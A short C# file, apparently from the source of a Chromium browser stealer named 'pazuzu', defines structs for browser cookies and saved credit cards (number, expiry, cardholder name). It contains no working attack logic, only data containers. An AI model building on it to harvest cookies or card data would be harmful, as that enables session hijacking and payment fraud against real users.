namespace pazuzu.ChromiumBased;

internal sealed class Common
{
	internal struct CCookie
	{
		public string hostname { get; set; }

		public string name { get; set; }

		public string path { get; set; }

		public string expiresutc { get; set; }

		public string key { get; set; }

		public string value { get; set; }

		public string issecure { get; set; }
	}

	internal struct CreditCard
	{
		public string number { get; set; }

		public string expyear { get; set; }

		public string expmonth { get; set; }

		public string name { get; set; }
	}
}
